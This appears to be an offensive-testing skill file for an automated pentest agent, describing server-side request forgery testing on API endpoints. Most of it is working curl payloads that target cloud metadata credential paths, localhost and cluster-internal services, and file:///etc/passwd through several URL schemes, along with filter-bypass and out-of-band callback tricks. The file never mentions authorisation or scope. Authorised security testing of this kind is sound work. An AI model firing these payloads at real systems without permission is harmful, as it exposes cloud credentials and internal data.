---
name: api-ssrf
description: Server-Side Request Forgery testing on API endpoints that accept URLs, webhooks, callbacks, or file references
intent: offensive
---

# API SSRF (OWASP API7)

## Purpose
Test API endpoints that fetch, validate, or process external URLs for server-side request forgery.

## Preconditions
- Identified an API endpoint that accepts a URL, hostname, webhook address, or file reference
- An OOB callback domain (from Xalgorix's oob_callback tool or interactsh)

## Attack Surface Signals
- Webhook registration endpoints (accept a callback URL)
- URL preview/screenshot endpoints
- File import from URL endpoints
- Link validation or unfurling
- PDF/image generation from URL
- Avatar/profile picture from URL
- Integration/OAuth callback URLs
- Import from external service endpoints

## Methodology

### Step 1: Identify SSRF Candidates
Look for API parameters that accept:
- Full URLs (`url`, `callback_url`, `webhook_url`, `image_url`)
- Hostnames (`host`, `domain`, `target`)
- File paths (`file`, `path`, `source`)
- Feed/document URLs (`feed_url`, `doc_url`, `import_url`)

### Step 2: Baseline with OOB Callback
```bash
# Generate an OOB callback token
# (use Xalgorix's oob_callback tool or interactsh)

# Test with the callback URL
curl -sk -X POST "https://TARGET/api/webhooks/register" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"callback_url":"https://OOB_TOKEN.oast.pro/test"}'

# Poll for the callback (OOB interaction proves the server made the request)
```

### Step 3: Internal Network Probing
```bash
# Cloud metadata endpoints
curl -sk -X POST "https://TARGET/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Internal services
curl -sk -X POST "https://TARGET/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:8080/admin"}'

# Internal DNS
curl -sk -X POST "https://TARGET/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-service.namespace.svc.cluster.local:8080/"}'
```

### Step 4: Scheme Manipulation
```bash
# Try different schemes
for scheme in file ftp gopher dict ldap; do
  curl -sk -X POST "https://TARGET/api/fetch" \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"${scheme}:///etc/passwd\"}"
done

# file:// scheme
curl -sk -X POST "https://TARGET/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"file:///etc/passwd"}'
```

### Step 5: Filter Bypass
```bash
# URL encoding
curl -sk -X POST "https://TARGET/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254%23.latest/meta-data"}'

# Redirect bypass: host a redirect on your OOB domain
# that redirects to http://169.254.169.254/latest/
curl -sk -X POST "https://TARGET/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://OOB_TOKEN.oast.pro/redirect"}'

# DNS rebinding (advanced)
# IPv6
curl -sk -X POST "https://TARGET/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://[::1]:8080/"}'
```

## Evidence Contract

An SSRF finding requires:
1. OOB callback received from the TARGET's infrastructure (not from the scanner)
2. OR internal service response content returned in the API response
3. The request was made by the SERVER (not the browser/client)

**NOT evidence**: The endpoint accepts a URL parameter, a 200 response from the endpoint, an error mentioning "connection refused" (may be the client, not the server)

## Common Misses
- Blind SSRF (server fetches but doesn't return content — verify via OOB timing)
- DNS rebinding for metadata endpoints with IP validation
- Redirects through the callback domain to internal targets
- Webhook endpoints that only fetch on specific events (trigger the event)
- Image/document processing that fetches resources
- PDF generation that embeds external content

## False Positives / Non-Findings
- The endpoint validates URLs and rejects internal IPs (properly configured)
- OOB callback from the SCANNER's IP (client-side request, not SSRF)
- A URL parameter that is only used client-side (JavaScript navigation, not server-side fetch)

## Xalgorix Tool Strategy
- `oob_callback` for OAST interaction proof
- `terminal_execute` with curl for precise URL manipulation
- `verify_timing` for blind SSRF via timing differentials

## Stopping Rule
Test every URL-accepting parameter with OOB, metadata, internal service, scheme, and filter bypass payloads.

## Handoff
Report each confirmed SSRF with the endpoint, the parameter, the OOB evidence (or response content), and what internal resource was accessed.
